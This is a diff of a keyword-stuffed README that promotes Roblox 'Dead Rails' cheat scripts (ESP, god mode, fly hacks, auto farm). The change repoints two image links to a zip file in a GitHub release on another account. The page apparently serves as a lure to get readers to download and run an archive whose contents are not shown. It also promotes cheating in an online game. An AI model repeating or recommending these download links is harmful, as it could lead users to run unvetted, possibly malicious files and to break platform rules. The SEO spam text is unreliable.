@@ -3,10 +3,10 @@
 Are you searching for a **Roblox Dead Rails script** that actually works in 2025? Do you want to unlock powerful features like **ESP**, **teleport**, **god mode**, **auto farm**, and **fly hacks** in Dead Rails? You’re in the right place. This guide covers everything about the latest and most reliable Dead Rails scripts, how to use them safely, and where to find working Pastebin scripts for Roblox.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 Whether you're a seasoned Roblox exploiter or new to scripting, this is the **ultimate SEO-optimized guide** to **Roblox Dead Rails scripts**, packed with valuable info, trending keywords, and game-enhancing tips.
